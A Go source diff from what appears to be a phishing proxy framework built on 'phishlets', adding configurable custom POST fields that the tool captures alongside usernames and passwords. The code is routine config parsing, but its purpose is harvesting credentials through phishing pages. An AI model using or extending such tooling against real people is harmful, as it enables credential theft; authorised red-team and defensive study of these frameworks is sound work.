@@ -44,6 +44,7 @@ type PhishletVersion struct {
 
 type PostField struct {
 	tp     string
+	key_s  string
 	key    *regexp.Regexp
 	search *regexp.Regexp
 }
@@ -63,6 +64,7 @@ type Phishlet struct {
 	password     PostField
 	landing_path []string
 	cfg          *Config
+	custom       []PostField
 }
 
 type ConfigProxyHost struct {
@@ -95,8 +97,9 @@ type ConfigPostField struct {
 }
 
 type ConfigCredentials struct {
-	Username *ConfigPostField `mapstructure:"username"`
-	Password *ConfigPostField `mapstructure:"password"`
+	Username *ConfigPostField   `mapstructure:"username"`
+	Password *ConfigPostField   `mapstructure:"password"`
+	Custom   *[]ConfigPostField `mapstructure:"custom"`
 }
 
 type ConfigPhishlet struct {
@@ -135,6 +138,7 @@ func (p *Phishlet) Clear() {
 	p.username.search = nil
 	p.password.key = nil
 	p.password.search = nil
+	p.custom = []PostField{}
 }
 
 func (p *Phishlet) LoadFromFile(path string) error {
@@ -287,8 +291,35 @@ func (p *Phishlet) LoadFromFile(path string) error {
 	if p.password.tp == "" {
 		p.password.tp = "post"
 	}
+	p.username.key_s = *fp.Credentials.Username.Key
+	p.password.key_s = *fp.Credentials.Password.Key
 
-	// TODO: add custom tokens
+	if fp.Credentials.Custom != nil {
+		for _, cp := range *fp.Credentials.Custom {
+			var err error
+			if cp.Key == nil {
+				return fmt.Errorf("credentials: missing custom `key` field")
+			}
+			if cp.Search == nil {
+				return fmt.Errorf("credentials: missing custom `search` field")
+			}
+			o := PostField{}
+			o.key, err = regexp.Compile(*cp.Key)
+			if err != nil {
+				return fmt.Errorf("credentials: %v", err)
+			}
+			o.search, err = regexp.Compile(*cp.Search)
+			if err != nil {
+				return err
+			}
+			o.tp = cp.Type
+			if o.tp == "" {
+				o.tp = "post"
+			}
+			o.key_s = *cp.Key
+			p.custom = append(p.custom, o)
+		}
+	}
 
 	p.landing_path = *fp.LandingPath
 
